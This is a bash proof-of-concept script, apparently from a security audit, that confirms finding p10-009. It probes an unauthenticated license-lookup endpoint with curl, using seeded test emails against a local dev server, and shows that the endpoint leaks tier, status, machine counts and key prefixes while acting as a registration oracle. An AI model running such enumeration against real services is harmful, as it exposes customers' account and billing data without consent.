#!/usr/bin/env bash
# PoC for p10-009: GET /api/get-license is a fully anonymous email-keyed enumeration
# oracle that discloses account status, paying tier, expiry, seat count, active
# machine count, and masked license-key fragments for ANY address.
#
# Chain (zero credentials, zero prior knowledge):
#   1. GET {{BASE_URL}}/api/get-license?email=victim.pro@example.test
#      -> 200 {"found":true,"tier":"pro","status":"active",...,"used_machines":3}
#      Handler resolves the row purely by c.email (license.ts:521/:541); registry
#      marks the route authentication:'none' (licensing-routes.ts). No session,
#      bearer, license key, or proof-of-ownership is involved anywhere.
#   2. Same for a second victim with a different tier/status -> org-wide profiling.
#   3. Control: unregistered email -> {"found":false} — the found/not-found delta
#      is the classic registration oracle; repeat over a scraped list to map
#      customers vs non-customers.
#
# Target: {{BASE_URL}} (filled at confirm time; defaults to local wrangler dev)
set -u
BASE="${1:-}"
case "$BASE" in ''|*'{{'*) BASE="http://127.0.0.1:8797";; esac

probe() {
  curl -s -m 10 -w "\n%{http_code}" "$BASE/api/get-license?email=$1"
}

echo "[*] Step 1: anonymous probe of victim #1 (pro tier, active, 3 machines)"
r1=$(probe "victim.pro@example.test")
c1=$(echo "$r1" | tail -1); b1=$(echo "$r1" | head -n -1)
echo "    GET /api/get-license?email=victim.pro@example.test -> HTTP $c1"
echo "    $b1"

echo "[*] Step 2: anonymous probe of victim #2 (team tier, canceled)"
r2=$(probe "victim.team@example.test")
c2=$(echo "$r2" | tail -1); b2=$(echo "$r2" | head -n -1)
echo "    GET /api/get-license?email=victim.team@example.test -> HTTP $c2"
echo "    $b2"

echo "[*] Step 3: control — unregistered address (registration oracle)"
r3=$(probe "nobody.unknown@example.test")
c3=$(echo "$r3" | tail -1); b3=$(echo "$r3" | head -n -1)
echo "    GET /api/get-license?email=nobody.unknown@example.test -> HTTP $c3"
echo "    $b3"

ok1=$(echo "$b1" | grep -c '"found":true')
ok2=$(echo "$b2" | grep -c '"found":true')
detail1=$(echo "$b1" | grep -c '"tier":"pro"')
detail2=$(echo "$b2" | grep -c '"tier":"team"')
machines=$(echo "$b1" | grep -c '"used_machines":3')
keymask=$(echo "$b1" | grep -c '"license_key":"lic_')
ctrl=$(echo "$b3" | grep -c '"found":false')

if [ "$c1" = "200" ] && [ "$ok1" = "1" ] && [ "$ok2" = "1" ] \
   && [ "$detail1" = "1" ] && [ "$detail2" = "1" ] && [ "$machines" = "1" ] \
   && [ "$keymask" = "1" ] && [ "$ctrl" = "1" ]; then
  echo '{"status":"confirmed","evidence":"unauthenticated GET /api/get-license?email=<victim> returned found:true with tier (pro/team), status (active/canceled), expires_at, max_machines, used_machines:3 and masked license_key prefix lic_ for seeded victims, while an unregistered email returned found:false — anonymous customer/tier/fleet enumeration oracle demonstrated","notes":"no credential of any kind sent; route registered authentication:none in site/shared/licensing-routes.ts; handler queries by c.email only (site/workers/src/handlers/license.ts:521,541)"}'
else
  echo '{"status":"failed","evidence":"pro='"$c1:$b1"' team='"$c2:$b2"' control='"$c3:$b3"'","notes":""}'
fi
